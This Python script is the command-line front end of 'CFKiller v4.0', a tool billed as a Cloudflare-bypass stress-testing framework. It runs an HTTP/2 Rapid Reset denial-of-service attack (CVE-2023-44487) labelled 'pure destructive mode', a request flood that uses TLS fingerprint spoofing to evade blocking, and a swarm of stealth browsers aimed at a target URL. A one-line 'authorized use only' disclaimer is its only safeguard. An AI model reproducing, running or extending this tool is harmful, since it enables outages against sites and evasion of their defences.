#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CFKiller v4.0 – Elite Stress Testing Framework
Uso exclusivo con autorización escrita (RoE)
2025 – Tu Nombre (el futuro de la ciberseguridad argentina)
"""

import asyncio
import typer
from typing import Optional
from datetime import datetime
import yaml

# Importamos nuestros módulos élite
from cfkiller.core.http2.rapid_reset import RapidResetAttacker
from cfkiller.core.tls.utils_client import spoofed_request
from cfkiller.core.browser.manager import BrowserPool
# (próximamente: swarm, proxy manager, reporter, etc.)

app = typer.Typer(
    name="CFKiller",
    help="Framework profesional de stress testing HTTP/2 + Cloudflare bypass – 2025",
    add_completion=False,
    rich_markup_mode="rich"
)

@app.command()
def rapid(
    target: str = typer.Argument(..., help="Dominio o URL objetivo (ej: tusitio.com)"),
    duration: int = typer.Option(60, "--time", "-t", help="Duración del ataque en segundos"),
    connections: int = typer.Option(80, "--conn", "-c", help="Conexiones HTTP/2 simultáneas"),
    intensity: int = typer.Option(1500, "--intensity", "-i", help="Streams por conexión antes del RST"),
    port: int = typer.Option(443, "--port", "-p", help="Puerto (443 o 8443 normalmente)"),
):
    """HTTP/2 Rapid Reset Attack (CVE-2023-44487) – Modo destructivo puro"""
    typer.echo(f"[bold red]CFKiller v4.0[/bold red] → Rapid Reset Attack")
    typer.echo(f"Objetivo: [bold cyan]{target}[/bold cyan] | Duración: {duration}s")

    attacker = RapidResetAttacker(
        host=target.split("://")[-1].split("/")[0],
        port=port,
        intensity=intensity,
        max_connections=connections,
        duration=duration
    )
    asyncio.run(attacker.attack())


@app.command()
def spoof(
    url: str = typer.Argument(..., help="URL completa a probar[](https://...)"),
    requests: int = typer.Option(1000, "--num", "-n", help="Cantidad de requests"),
    concurrency: int = typer.Option(200, "--concurrency", "-c", help="Requests concurrentes"),
):
    """uTLS + JA3 spoofing real – Pasa como navegador 100% legítimo"""
    typer.echo(f"[bold green]Iniciando {requests} requests con uTLS spoofing[/bold green]")

    async def worker():
        tasks = [
            spoofed_request(url, proxy=None)
            for _ in range(requests)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = len([r for r in results if isinstance(r, tuple) and r[0] == 200])
        blocked = len([r for r in results if isinstance(r, tuple) and r[0] in [403, 503, 1020]])

        typer.echo(f"\n[Success] {success} | [Blocked] {blocked} | [Error] {requests - success - blocked}")

    asyncio.run(worker())


@app.command()
def browser(
    url: str = typer.Argument(..., help="URL objetivo"),
    browsers: int = typer.Option(100, "--browsers", "-b", help="Navegadores concurrentes"),
    duration: int = typer.Option(120, "--time", "-t", help="Duración en segundos"),
):
    """Ataque con navegadores reales (undetected-playwright + stealth)"""
    typer.echo(f"[bold magenta]Lanzando {browsers} navegadores reales contra {url}[/bold magenta]")

    async def run():
        pool = BrowserPool(pool_size=browsers)
        await pool.start()

        start = datetime.now()
        while (datetime.now() - start).seconds < duration:
            await asyncio.gather(*[pool.visit(url) for _ in range(browsers // 10)])
            await asyncio.sleep(1)

        await pool.stop()

    asyncio.run(run())


@app.command()
def version():
    """Muestra versión y créditos"""
    typer.echo("[bold red]CFKiller v4.0 – Elite Edition[/bold red]")
    typer.echo("HTTP/2 Rapid Reset + uTLS + Undetected Browser Pool")
    typer.echo("Solo para pentest autorizado – 2025")
    typer.echo("Hecho con pasión en Argentina")


if __name__ == "__main__":
    app()